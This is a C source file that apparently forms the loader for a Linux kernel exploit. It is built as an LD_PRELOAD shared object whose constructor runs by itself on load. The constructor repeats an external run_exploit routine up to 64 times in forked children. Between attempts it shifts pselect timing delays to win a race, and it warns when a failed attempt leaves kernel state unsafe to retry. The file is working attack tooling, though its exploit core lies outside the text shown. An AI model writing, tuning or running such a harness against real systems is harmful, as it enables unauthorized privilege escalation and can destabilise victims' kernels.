#include "common.h"

#define DEFAULT_EXPLOIT_ATTEMPTS 16
#define DEFAULT_PSELECT_DELAY_USEC 20000
#define DEFAULT_BOOT_QUIET_SEC 20
#define DEFAULT_ATTEMPT_COOLDOWN_MS 250

static unsigned long long rmg_trace4_us(void) {
  struct timespec ts;
  if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0)
    return 0;
  return (unsigned long long)ts.tv_sec * 1000000ULL +
         (unsigned long long)ts.tv_nsec / 1000ULL;
}

static int env_int(const char *name, int fallback, int min, int max) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return fallback;
  }

  char *end = NULL;
  errno = 0;
  long parsed = strtol(value, &end, 0);
  if (errno || end == value || *end || parsed < min || parsed > max) {
    return fallback;
  }
  return (int)parsed;
}

static int attempt_delay_usec(int base_delay, int attempt) {
  static const int offsets[] = {
    0, 10000, 30000, 5000, 20000, -5000, 40000, 15000,
  };
  int count = (int)(sizeof(offsets) / sizeof(offsets[0]));
  int delay = base_delay + offsets[(attempt - 1) % count];
  return delay < 0 ? 0 : delay;
}

static void wait_for_boot_quiet_window(void) {
  int min_uptime = env_int("BOOT_QUIET_SEC", DEFAULT_BOOT_QUIET_SEC, 0, 300);
  if (min_uptime <= 0)
    return;
  struct timespec uptime;
  if (clock_gettime(CLOCK_BOOTTIME, &uptime) != 0)
    return;
  if (uptime.tv_sec >= min_uptime)
    return;
  time_t wait_sec = min_uptime - uptime.tv_sec;
  pr_info("waiting for boot allocator quiet window seconds=%lld uptime=%lld\n",
          (long long)wait_sec, (long long)uptime.tv_sec);
  while (wait_sec > 0)
    wait_sec = sleep((unsigned int)wait_sec);
}

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;
  set_unbuffer();
  if (!getenv("SLIDE_ONLY"))
    wait_for_boot_quiet_window();

  int max_attempts = env_int(
      "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
  int base_delay = env_int(
      "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
  int cooldown_ms = env_int(
      "ATTEMPT_COOLDOWN_MS", DEFAULT_ATTEMPT_COOLDOWN_MS, 0, 5000);
  if (getenv("SLIDE_ONLY")) {
    max_attempts = 1;
  }

  unsetenv("LD_PRELOAD");
  char *argv[] = {"preload.so", NULL};

  pr_success("preload supervisor pid=%d attempts=%d base_delay=%d cooldown_ms=%d\n",
             getpid(), max_attempts, base_delay, cooldown_ms);

  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    int delay_usec = attempt_delay_usec(base_delay, attempt);
    unsigned long long attempt_start_us = rmg_trace4_us();
    pr_info("[trace4-supervisor] phase=before-fork attempt=%d/%d t_us=%llu delay=%d\n",
            attempt, max_attempts, attempt_start_us, delay_usec);
    pid_t child = SYSCHK(fork());
    if (child == 0) {
      char delay[16];
      snprintf(delay, sizeof(delay), "%d", delay_usec);
      SYSCHK(setenv("PSELECT_DELAY_USEC", delay, 1));
      pr_success("exploit attempt=%d/%d pid=%d delay=%d\n",
                 attempt, max_attempts, getpid(), delay_usec);
      int rc = run_exploit(1, argv);
      pr_info("[trace4-supervisor] phase=child-return attempt=%d/%d pid=%d rc=%d t_us=%llu\n",
              attempt, max_attempts, getpid(), rc, rmg_trace4_us());
      _exit(rc);
    }

    int status = 0;
    pid_t waited;
    do {
      waited = waitpid(child, &status, 0);
    } while (waited < 0 && errno == EINTR);
    unsigned long long reaped_us = rmg_trace4_us();
    pr_info("[trace4-supervisor] phase=child-reaped attempt=%d/%d child=%d "
            "raw_status=%d elapsed_us=%llu t_us=%llu\n",
            attempt, max_attempts, child, status,
            reaped_us >= attempt_start_us ? reaped_us - attempt_start_us : 0,
            reaped_us);
    if (waited < 0) {
      pr_error("waitpid attempt=%d pid=%d errno=%d\n",
               attempt, child, errno);
    }
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
      pr_success("exploit completed attempt=%d/%d\n", attempt, max_attempts);
      return;
    }

    if (WIFEXITED(status) && WEXITSTATUS(status) == CFI_RETRY_BLOCKED_EXIT) {
      pr_error("exploit attempt=%d/%d left kernel state that is unsafe to "
               "retry; reclaim pages are held. reboot before trying again\n",
               attempt, max_attempts);
      return;
    }

    if (WIFSIGNALED(status)) {
      pr_warning("exploit attempt=%d/%d terminated signal=%d\n",
                 attempt, max_attempts, WTERMSIG(status));
    } else {
      pr_warning("exploit attempt=%d/%d failed status=%d\n",
                 attempt, max_attempts,
                 WIFEXITED(status) ? WEXITSTATUS(status) : status);
    }

    if (attempt < max_attempts && cooldown_ms > 0)
      usleep((useconds_t)cooldown_ms * 1000U);
  }

  pr_error("exploit failed after %d independent attempts\n", max_attempts);
  _exit(1);
}
